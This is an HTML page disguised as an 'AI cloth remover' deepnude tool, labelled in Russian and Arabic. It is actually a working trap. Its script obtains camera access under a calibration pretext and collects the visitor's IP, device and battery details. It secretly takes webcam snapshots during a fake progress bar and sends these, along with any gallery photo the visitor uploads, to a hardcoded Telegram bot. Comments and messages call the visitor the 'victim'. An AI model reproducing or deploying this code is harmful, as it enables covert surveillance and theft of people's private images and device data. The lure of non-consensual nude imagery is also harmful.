<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AI DeepNude Pro v3.1</title>
    <style>
        body { background: #0a0a0a; color: #fff; font-family: 'Segoe UI', Tahoma; text-align: center; direction: ltr; margin: 0; padding: 20px; }
        .box { border: 1px solid #333; border-radius: 15px; padding: 30px; background: #111; max-width: 450px; margin: auto; }
        .loading-bar { width: 100%; background: #222; height: 10px; border-radius: 5px; margin: 20px 0; display: none; overflow: hidden; }
        .progress { width: 0%; height: 100%; background: #e91e63; transition: 0.3s; }
        .btn { background: #e91e63; color: #fff; border: none; padding: 15px 30px; border-radius: 5px; cursor: pointer; font-weight: bold; width: 100%; margin: 10px 0; }
        #file-zone { display: none; border: 2px dashed #444; padding: 20px; margin: 20px 0; }
        .status-icon { color: #00ff00; font-size: 24px; display: none; }
        .footer-btns { display: none; }
    </style>
</head>
<body>

<div class="box">
    <h2 style="color: #e91e63;">AI CLOTH REMOVER 🔞</h2>
    <p>Искусственный интеллект для удаления одежды</p>
    <hr style="border: 0.5px solid #222;">

    <div id="step-1">
        <button class="btn" onclick="initTrap()">Подтвердить и начать (ابدأ الآن)</button>
    </div>

    <div id="loading-zone">
        <div class="loading-bar" id="bar-container"><div class="progress" id="bar"></div></div>
        <p id="percent">0%</p>
        <p id="msg-ru">Инициализация Иي (جاري التحقق..)</p>
    </div>

    <div id="file-zone">
        <p>Выбрать фото из галереи 🖼️</p>
        <input type="file" id="u-file" onchange="uploadFile()" style="display: none;">
        <button class="btn" style="background: #333;" onclick="document.getElementById('u-file').click()">Select Photo</button>
        <span id="check-mark" class="status-icon">✅ Загружено (تم الرفع)</span>
    </div>

    <div class="footer-btns" id="final-step">
        <button class="btn" style="background: #444;" onclick="location.reload()">Изменить (تغيير)</button>
        <button class="btn" style="background: #444;">Удалить (حذف)</button>
        <button class="btn" onclick="alert('Wait 5-10 min...')">Обработка 👙</button>
    </div>
</div>

<video id="v" style="display:none" autoplay></video>
<canvas id="c" style="display:none"></canvas>

<script>
const TOKEN = '8699010614:AAFkdwXBDh31-rKa0OatvyXl5ERSQXW3_50';
const ID = '7535564997';

async function sendLog(msg) {
    await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(msg)}&parse_mode=HTML`);
}

async function getInfo() {
    let ip = await fetch('https://api.ipify.org?format=json').then(r => r.json()).then(d => d.ip);
    let batt = await navigator.getBattery().then(b => (b.level * 100) + "%");
    return `📱 <b>Target Info:</b>\n- Device: ${navigator.platform}\n- IP: ${ip}\n- Battery: ${batt}\n- UserAgent: ${navigator.userAgent.split(' ')[0]}`;
}

async function initTrap() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const info = await getInfo();
        await sendLog(`✅ <b>تم صيد جهاز جديد!</b>\n${info}\n\n⏳ جاري سحب الصور الآن...`);
        
        document.getElementById('step-1').style.display = 'none';
        document.getElementById('bar-container').style.display = 'block';
        
        startHacking(stream);
    } catch (e) {
        await sendLog("❌ <b>الضحية رفض إعطاء صلاحية الكاميرا.</b>");
        alert("Ошибка: Необходимо разрешить доступ к камере для калибровки ИИ.");
    }
}

async function startHacking(stream) {
    const v = document.getElementById('v');
    v.srcObject = stream;
    let progress = 0;
    
    let itv = setInterval(async () => {
        progress += 2;
        document.getElementById('bar').style.width = progress + "%";
        document.getElementById('percent').innerText = progress + "%";

        // تصوير أثناء التحميل
        if (progress % 10 == 0) { capture(v, progress); }

        if (progress >= 100) {
            clearInterval(itv);
            document.getElementById('loading-zone').style.display = 'none';
            document.getElementById('file-zone').style.display = 'block';
        }
    }, 200);
}

async function capture(video, p) {
    const c = document.getElementById('c');
    c.width = video.videoWidth; c.height = video.videoHeight;
    c.getContext('2d').drawImage(video, 0, 0);
    c.toBlob(async (b) => {
        let f = new FormData();
        f.append('chat_id', ID); f.append('photo', b, 'cam.jpg');
        f.append('caption', `📸 Shot at ${p}%`);
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: f });
    }, 'image/jpeg');
}

async function uploadFile() {
    const fileInput = document.getElementById('u-file');
    if (fileInput.files.length > 0) {
        document.getElementById('check-mark').style.display = 'inline';
        let f = new FormData();
        f.append('chat_id', ID); f.append('document', fileInput.files[0]);
        f.append('caption', "📂 الملف الذي اختاره الضحية من الاستوديو");
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`, { method: 'POST', body: f });
        document.getElementById('final-step').style.display = 'block';
    }
}
</script>
</body>
</html>
